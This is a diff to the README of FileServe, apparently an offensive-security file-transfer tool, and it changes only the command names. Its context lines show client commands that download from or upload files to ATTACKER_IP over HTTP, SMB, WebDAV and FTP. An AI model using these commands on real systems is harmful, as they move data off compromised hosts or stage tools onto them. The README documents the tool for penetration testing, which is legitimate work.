@@ -45,14 +45,14 @@ Clone the repository:
 ```bash
 git clone https://github.com/4m3rr0r/FileServe.git
 cd FileServe
-chmod +x FileServe
+chmod +x fileserve
 sudo mv fileserve /usr/local/bin/
 ```
 
 Run:
 
 ```bash
-./fileserve.sh --help
+fileserve --help
 ```
 
 The script will automatically install required dependencies.
@@ -95,7 +95,7 @@ FileServe [MODE] [OPTIONS]
 ### Start HTTP Download Server
 
 ```bash
-./fileserve.sh -d 
+fileserve -d 
 ```
 
 Client:
@@ -109,7 +109,7 @@ wget http://ATTACKER_IP:8000/file.txt
 ## SMB Share
 
 ```bash
-./fileserve.sh --smb
+fileserve --smb
 ```
 
 Windows:
@@ -129,7 +129,7 @@ net use D: \\ATTACKER_IP\share
 ## WebDAV Upload Server
 
 ```bash
-./fileserve.sh --nginx
+fileserve --nginx
 ```
 
 Upload from Linux:
@@ -143,7 +143,7 @@ curl -T file.txt http://ATTACKER_IP:9001/upload/file.txt
 ## Upload Server
 
 ```bash
-./fileserve.sh --upload
+fileserve --upload
 ```
 
 Upload file:
@@ -157,7 +157,7 @@ curl -X POST http://ATTACKER_IP:8080/upload -F 'files=@file.txt'
 ## FTP Server
 
 ```bash
-./fileserve.sh --ftp
+fileserve --ftp
 ```
 
 Upload:
@@ -173,7 +173,7 @@ curl -T file.txt ftp://ATTACKER_IP:2121/
 You can enable authentication with:
 
 ```bash
-./fileserve.sh --ftp -U user -P pass
+fileserve --ftp -U user -P pass
 ```
 
 ---
